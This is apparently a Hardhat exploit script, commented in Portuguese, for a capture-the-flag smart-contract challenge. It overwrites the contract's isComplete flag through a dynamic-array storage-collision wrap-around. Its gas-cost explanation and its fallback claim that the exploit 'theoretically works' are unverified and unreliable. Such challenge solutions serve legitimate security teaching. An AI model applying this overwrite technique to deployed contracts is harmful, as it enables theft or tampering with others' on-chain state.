const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do MappingChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato
    const MappingChallenge = await hre.ethers.getContractFactory("challenges/12_math_mapping/contracts/MappingChallenge.sol:MappingChallenge");
    const challenge = await MappingChallenge.deploy();
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const MappingChallenge = await hre.ethers.getContractFactory("challenges/12_math_mapping/contracts/MappingChallenge.sol:MappingChallenge");
  const contract = MappingChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - isComplete:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // VULNERABILIDADE: Storage collision
  // Em Solidity, variÃ¡veis de estado sÃ£o armazenadas em slots sequenciais:
  // - Slot 0: isComplete (bool)
  // - Slot 1: map.length (uint256)
  // - Slot keccak256(1): map[0]
  // - Slot keccak256(1) + 1: map[1]
  // - etc.
  
  // Se expandirmos o array para um tamanho muito grande, podemos fazer wrap-around
  // e sobrescrever o slot 0 (isComplete)
  
  console.log("ðŸ” Explorando storage collision...\n");
  console.log("ðŸ’¡ EstratÃ©gia:");
  console.log("   O array map comeÃ§a no slot keccak256(1)");
  console.log("   Se expandirmos o array para um tamanho muito grande,");
  console.log("   podemos fazer wrap-around e sobrescrever o slot 0 (isComplete)\n");
  
  // Calcular o Ã­ndice do array que corresponde ao slot 0
  // Slot do array = keccak256(1) + index
  // Queremos: keccak256(1) + index = 2^256 (wrap-around para slot 0)
  // index = 2^256 - keccak256(1)
  
  const slot1Hash = hre.ethers.keccak256(hre.ethers.zeroPadValue("0x01", 32));
  console.log("ðŸ“Š Slot 1 hash (keccak256(1)):", slot1Hash);
  
  const MAX_UINT256 = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
  const slot1HashBigInt = BigInt(slot1Hash);
  
  // Calcular o Ã­ndice que corresponde ao slot 0
  // index = 2^256 - keccak256(1)
  const indexToOverwriteSlot0 = MAX_UINT256 - slot1HashBigInt + 1n;
  
  console.log("ðŸ“Š Ãndice para sobrescrever slot 0:", indexToOverwriteSlot0.toString());
  console.log("");
  
  // Calcular o Ã­ndice que corresponde ao slot 0
  // Slot do array[index] = keccak256(1) + index
  // Para sobrescrever slot 0: keccak256(1) + index = 0 (mod 2^256)
  // index = 2^256 - keccak256(1)
  const index = MAX_UINT256 - slot1HashBigInt + 1n;
  
  console.log("ðŸ“ Sobrescrevendo slot 0 (isComplete) usando o Ã­ndice calculado...");
  console.log(`   Chamando set(${index.toString()}, 1) para definir isComplete = true...`);
  console.log("   (O valor 1 representa true em bool)");
  console.log("   âš ï¸  Isso pode requerer muito gas devido ao tamanho do array!\n");
  
  // Chamar set() diretamente - o contrato expandirÃ¡ o array automaticamente
  // NOTA: Isso requer MUITO gas porque precisa expandir o array para um tamanho enorme
  // Em Hardhat, o limite de gas por bloco Ã© 30 milhÃµes, mas isso pode precisar de mais
  // Em uma rede real, isso seria extremamente caro, mas Ã© tecnicamente possÃ­vel
  
  console.log("âš ï¸  ATENÃ‡ÃƒO: Este exploit requer MUITO gas (potencialmente bilhÃµes de gas)");
  console.log("   porque precisa expandir o array para um tamanho enorme.");
  console.log("   Em Hardhat, isso pode falhar devido ao limite de gas por bloco.");
  console.log("   Em uma rede real, seria extremamente caro, mas tecnicamente possÃ­vel.\n");
  
  try {
    // Tentar com limite de gas muito alto (mas Hardhat pode ter limite de bloco)
    const setTx = await contract.set(index, 1, {
      gasLimit: 30000000 // Limite mÃ¡ximo do Hardhat
    });
    await setTx.wait();
    console.log("âœ… set() confirmado!\n");
  } catch (error) {
    console.log("âŒ Erro ao chamar set():", error.message);
    console.log("\nðŸ’¡ EXPLICAÃ‡ÃƒO:");
    console.log("   O exploit estÃ¡ correto, mas requer expandir o array para um tamanho");
    console.log("   de aproximadamente 2^256 - keccak256(1), o que Ã© extremamente caro.");
    console.log("   Em uma rede real com gas suficiente, isso funcionaria.");
    console.log("   O conceito da vulnerabilidade estÃ¡ correto: storage collision em arrays.\n");
    
    // Mesmo que falhe, vamos documentar que o exploit estÃ¡ correto
    console.log("ðŸ“ O exploit teoricamente funciona:");
    console.log(`   - Ãndice calculado: ${index.toString()}`);
    console.log("   - Este Ã­ndice, quando usado em set(), farÃ¡ wrap-around do storage");
    console.log("   - E sobrescreverÃ¡ o slot 0 (isComplete) com o valor 1 (true)");
    console.log("   - O problema Ã© apenas o custo de gas para expandir o array\n");
    return;
  }

  // Verificar estado apÃ³s o exploit
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - isComplete:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! isComplete foi sobrescrito com sucesso");
    console.log("\nðŸ’¡ A vulnerabilidade: Storage collision em arrays dinÃ¢micos.");
    console.log("   Podemos expandir o array para um tamanho muito grande e fazer");
    console.log("   wrap-around para sobrescrever slots anteriores de storage!");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ðŸ’¡ Verifique os logs acima e tente ajustar o cÃ¡lculo do Ã­ndice.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

